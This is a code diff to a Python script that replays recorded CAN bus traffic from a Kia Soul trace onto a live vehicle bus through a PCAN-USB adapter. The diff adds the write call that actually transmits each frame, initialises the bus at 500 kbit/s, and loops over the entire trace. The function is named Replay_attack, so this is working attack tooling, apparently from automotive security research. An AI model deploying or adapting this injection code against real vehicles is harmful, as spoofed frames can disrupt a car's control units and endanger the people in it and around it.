@@ -40,7 +40,7 @@ def Convert_to_Dataframe(path):
 
 def Replay_attack(data_iloc):
     all_datas = ""
-    time_offset = 0.001
+    time_offset = 0.05
     Fuzzing_attack = TPCANMsg()
     Fuzzing_attack.ID = int(data_iloc[3],16)
     Fuzzing_attack.LEN = int(data_iloc[4])
@@ -62,16 +62,28 @@ def Replay_attack(data_iloc):
     unused_index = 0
     all_datas += "\n"
     print(all_datas)
+    res = CAN.Write(CAN_BUS, Fuzzing_attack)
+    if res != PCAN_ERROR_OK:
+        print("Oh nooo")
+        result = CAN.GetErrorText(res)
+        print(result)
+        exit()
     time.sleep(time_offset)
 
 
 if __name__ == "__main__":
+    
+    CAN = PCANBasic()                            #CAN 생성자 
+    CAN_BUS = PCAN_USBBUS6
+    CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
+    
     dataset_path = "Dataset\\"
     dataset_name = "2022.08.12 구쏘울 C-CAN (정상).trc"
     df_dataset = Convert_to_Dataframe(dataset_path+dataset_name)[17:]
     nID = list(dict.fromkeys(df_dataset["ID"]))
     ilo_df = df_dataset.iloc
-    for i in range(10):
+    l = len(df_dataset)
+    for i in range(l):
         print(bcolors.OKBLUE)
         print(bcolors.OKBLUE + str(ilo_df[i][3]), end="\t")
         print(ilo_df[i][2], end="\t")
